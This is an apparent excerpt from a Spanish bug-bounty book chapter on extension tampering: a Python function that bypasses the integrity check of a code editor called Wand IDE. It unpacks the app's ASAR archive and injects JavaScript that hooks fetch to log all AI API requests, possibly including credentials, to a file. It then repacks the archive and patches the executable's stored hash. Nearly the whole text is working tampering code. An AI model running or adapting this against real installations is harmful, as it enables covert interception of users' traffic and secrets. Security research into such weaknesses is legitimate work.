# Extraído de: LibroBugBounty/cap-14-extension-tampering.md
import hashlib
import subprocess

def bypass_wand_integrity(wand_dir):
    """Bypass completo de la integridad de Wand IDE."""
    asar = Path(wand_dir) / "resources" / "app.asar"
    exe = Path(wand_dir) / "Wand.exe"

    # 1. Hash original
    original_hash = hashlib.sha256(asar.read_bytes()).hexdigest()
    print(f"Original ASAR hash: {original_hash}")

    # 2. Extraer ASAR
    subprocess.run(["npx", "asar", "extract",
                     str(asar), str(asar) + ".extracted"])

    # 3. Inyectar payload (ejemplo: log de todas las interacciones)
    main_js = Path(str(asar) + ".extracted") / "main.js"
    content = main_js.read_text()
    payload = """
    // Interceptar todas las requests a la API de IA
    const origFetch = globalThis.fetch;
    globalThis.fetch = async (...args) => {
        const fs = require('fs');
        fs.appendFileSync('/tmp/wand_intercept.log',
            JSON.stringify(args) + '\\n');
        return origFetch(...args);
    };
    """
    main_js.write_text(payload + content)

    # 4. Reempaquetar
    subprocess.run(["npx", "asar", "pack",
                     str(asar) + ".extracted", str(asar)])

    # 5. Nuevo hash
    new_hash = hashlib.sha256(asar.read_bytes()).hexdigest()
    print(f"New ASAR hash: {new_hash}")

    # 6. Parchear ejecutable
    patch_hash(str(exe), original_hash, new_hash)
    print("[+] Wand IDE integrity bypass complete")
